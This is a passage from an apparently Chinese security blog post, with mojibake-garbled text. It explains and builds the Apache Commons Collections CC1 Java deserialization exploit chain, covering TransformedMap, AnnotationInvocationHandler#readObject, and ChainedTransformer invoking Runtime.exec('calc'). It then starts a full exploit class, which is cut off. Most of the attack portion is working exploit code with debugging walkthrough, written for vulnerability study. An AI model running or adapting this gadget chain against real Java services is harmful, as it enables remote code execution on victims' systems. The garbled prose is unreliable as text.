punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>decorateå°±æ˜¯ä¸ºäº†ç»™mapè£…é¥°ä¸Škeyå’Œvalueï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ‰¾å“ªé‡Œè°ƒç”¨checksetValueäº†ã€‚åªæœ‰1å¤„è°ƒç”¨ï¼šAbstractInputCheckedMapDecorator.MapEntry#setValue</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">setValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    value <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>parentæ˜¯é€šè¿‡protectedç±»å‹çš„æ„é€ æ–¹æ³•èµ‹å€¼ï¼Œ**parentè¦èµ‹å€¼new TransformedMap()**ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">MapEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token punctuation">,</span> AbstractInputCheckedMapDecorator parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†setValueæ–¹æ³•ã€‚é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“éå†Mapå¯ä»¥é€šè¿‡Map.Entryè¿›è¡Œéå†ï¼Œè€Œå…¶ä¸­æœ‰entry.setValueæ–¹æ³•ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•è°ƒç”¨AbstractInputCheckedMapDecorator.MapEntryçš„setValueæ–¹æ³•ï¼Ÿ</p><p>ä¹‹å‰æˆ‘ä»¬è°ƒç”¨äº†decorateæ–¹æ³•å®ä¾‹åŒ–TransformedMapï¼Œè€ŒTransformedMapçš„çˆ¶ç±»æ­£æ˜¯AbstractInputCheckedMapDecoratorï¼Œå¦‚æœæˆ‘ä»¬éå†TransformedMapç±»å‹çš„Mapï¼Œé‚£ä¹ˆè‡ªå·±æ²¡æœ‰setValueæ–¹æ³•è‡ªç„¶å°±è°ƒç”¨äº†çˆ¶ç±»çš„setValueæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬éå†TransformedMapè¿™ä¸ªç±»å‹çš„Mapå°±å¯ä»¥äº†ã€‚</p><p>è¿˜è¦æ³¨æ„ä¸€ç‚¹ï¼Œéå†Mapè¦ä¿è¯Mapä¸ä¸ºç©ºï¼Œä¸ç„¶éƒ½è¿›ä¸å»forå¾ªç¯è‡ªç„¶è°ƒç”¨ä¸äº†setValueæ–¹æ³•ã€‚</p><p>æ­¤æ—¶çš„expï¼š</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer invokerTransformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token operator">:</span>transformedMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//debugè°ƒè¯•ï¼ŒsetValueçš„å‚æ•°æ­£æ˜¯æœ€åä¼ åˆ°InvokerTransformer#transformçš„inputï¼Œå› æ­¤è¿™é‡Œå°±æ˜¯èµ‹å€¼Runtimeçš„å®ä¾‹åŒ–ã€‚</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥æ‰¾è°è°ƒç”¨äº†setValueï¼Œæˆ‘ä»¬å‘ç°AnnotationInvocationHandlerçš„readobjectç›´æ¥å°±è°ƒç”¨äº†setValueã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...ç•¥</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>                Object value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿè¯¥ç±»çš„æ„é€ æ–¹æ³•ä¸ºdefaultï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½é€šè¿‡åå°„æ¥è°ƒç”¨ã€‚</p><pre class="line-numbers language-java"><code class="language-java">        Class <span class="token class-name">c</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åå°„è°ƒç”¨åï¼Œæ˜¯ä¸æ˜¯è§‰å¾—å¯ä»¥å°è¯•ååºåˆ—åŒ–æµ‹è¯•äº†ï¼Ÿ</p><p>æ³¨æ„å‰é¢çš„æ³¨é‡Šï¼ŒRuntimeç±»æ˜¯ä¸å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½é€šè¿‡Runtime.getRuntime()æ¥è¿›è¡Œåºåˆ—åŒ–ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿéœ€è¦åå°„æ¥è°ƒç”¨ã€‚</p><pre class="line-numbers language-java"><code class="language-java">        Method method<span class="token operator">=</span> <span class="token punctuation">(</span>Method<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime r<span class="token operator">=</span> <span class="token punctuation">(</span>Runtime<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä»”ç»†è°ƒè¯•æˆ–è€…é˜…è¯»æºç å°±ä¼šå‘ç°ä»…ä»…å‡­å€ŸInvokerTransformeræ˜¯èµ°ä¸é€šçš„ï¼Œå› ä¸ºå¯ä»¥çœ‹åˆ°checkSetValueåªè°ƒç”¨äº†ä¸€æ¬¡transformï¼Œå¹¶ä¸”AnnotationInvocationHandler#readobjectç»™Mapèµ‹å€¼æ˜¯å†™æ­»ä¸ºnew AnnotationTypeMismatchExceptionProxyçš„ï¼Œè€Œæˆ‘ä»¬è¦ä¼ è¿›æ¥çš„æ˜¯Runtime.classï¼ˆå› ä¸ºè¦RCEï¼‰ï¼Œæ‰€ä»¥ä½ æ²¡åŠæ³•é€šè¿‡InvokerTransformeç›´æ¥åå°„RCEã€‚</p><p>è€Œæˆ‘ä»¬å‘ç°ï¼ŒTransformerçš„å®ç°æœ‰è¿™é‡è¦çš„ä¸‰ç§ï¼š</p><ol><li>ConstantTransformer â€“&gt; æŠŠâ¼€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¸¸é‡</li><li>InvokerTransformer â€“&gt; é€šè¿‡åå°„ï¼Œè¿”å›â¼€ä¸ªå¯¹è±¡ -&gt; åå°„è·å–æ‰§è¡Œæ–¹æ³•åŠ å…¥å‚æ•°</li><li>ChainedTransformer â€“&gt;æ‰§â¾é“¾å¼çš„Transformerâ½…æ³• -&gt;å°†åå°„åŒ…å«çš„æ•°ç»„è¿›è¡Œé“¾å¼è°ƒç”¨ï¼Œä»è€Œè¿è´¯èµ·æ¥</li></ol><p><strong>å› æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ChainedTransformerè¾¾åˆ°è°ƒç”¨å¤šæ¬¡transformæ–¹æ³•çš„ç›®çš„ï¼Œè¯¥å‡½æ•°æ˜¯æŠŠå‰ä¸€ä¸ªçš„è¾“å‡ºå½“ä½œå½“å‰çš„transformæ–¹æ³•çš„è¾“å…¥æ‰§è¡Œã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºnew ConstantTransformer(Runtime.class)ï¼Œè¯¥ç±»æŠŠâ¼€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¸¸é‡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ è¿›å»Runtime.classï¼Œä»–å°±ä¼šè¿”å›Runtime.classï¼Œè€Œä¸æ˜¯annotationTypeMismatchExceptionProxyï¼Œè¿™ä¹Ÿå°±ç»•è¿‡äº†ä¹‹å‰æåˆ°å†™æ­»çš„å‚æ•°ã€‚</strong></p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å›é¡¾checkSetValueã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å›é¡¾AnnotationInvocationHandlerçš„readobjectå…³é”®ä»£ç ã€‚</p><pre class="line-numbers language-java"><code class="language-java">                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è°ƒè¯•-é“¾å­"><a href="#è°ƒè¯•-é“¾å­" class="headerlink" title="è°ƒè¯•+é“¾å­"></a>è°ƒè¯•+é“¾å­</h5><p>é¦–å…ˆååºåˆ—åŒ–æ‰§è¡ŒAnnotationInvocationHandler#readobjectï¼Œè°ƒç”¨äº†setValueæ–¹æ³•ï¼Œå¹¶ä¸”å†™æ­»äº†ä¼ å…¥çš„å‚æ•°ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818222425288.png" alt="image-20220818222425288"  /><p>æ¥ç€è°ƒç”¨äº†AbstractInputCheckedMapDecorator#setValue,å¯ä»¥çœ‹åˆ°parentä¸ºTransformedMapï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦Map&lt;Object,Object&gt; transformedMap&#x3D;TransformedMap.decorate(map,null,c)çš„åŸå› ï¼Œå°±æ˜¯ä¸ºäº†è°ƒç”¨ä»–çš„çˆ¶ç±»AbstractInputCheckedMapDecorator#setValueæ–¹æ³•</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818223127855.png" alt="image-20220818223127855"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œæ­¤æ—¶valueè¿˜æ˜¯å†™æ­»çš„å‚æ•°ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224244527.png" alt="image-20220818224244527"></p><p>è¿›å…¥åˆ°é“¾å¼è°ƒç”¨transform</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224356049.png" alt="image-20220818224356049"></p><p>å•æ­¥æ‰§è¡Œã€‚æ­¤æ—¶ä¼šæ‰§è¡Œè°çš„transformå‘¢ï¼Ÿ</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224442142.png" alt="image-20220818224442142"></p><p>è·Ÿè¿›å»çœ‹çœ‹ï¼Œå½“ç„¶æ˜¯æ‰§è¡ŒConstantTransformerçš„transformå•¦ã€‚å› ä¸ºæˆ‘ä»¬é“¾å¼è°ƒç”¨æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯ConstantTransformerï¼Œå› æ­¤ä»–ç›´æ¥è¿”å›æ„é€ å‡½æ•°æ„é€ å¥½çš„iConstantï¼Œä¹Ÿå°±æ˜¯Runtime.class!!è¦†ç›–äº†å†™æ­»çš„å€¼ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224550799.png" alt="image-20220818224550799"></p><p>ä¹‹åå°±æŠŠConstantTransformer#transformçš„è¾“å‡ºRuntime.classä¼ ç»™ä¸‹ä¸€ä¸ªtransformçš„inputï¼Œä¹Ÿå°±æ˜¯invoke getRuntimeæ–¹æ³•ä»è€Œè·å–å®ä¾‹ï¼Œæ¥ç€åœ¨é€šè¿‡è·å–åˆ°çš„ç¤ºä¾‹æ‰§è¡Œexecæ–¹æ³•å³å¯RCEã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818225352146.png" alt="image-20220818225352146"></p><p>é“¾å­æ¯”è¾ƒçŸ­ï¼Œä½†æ˜¯å‘ç‚¹æ¯”è¾ƒå¤šã€‚</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator<span class="token punctuation">.</span>MapEntry#setValueTransformedMap#checksetValueInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token 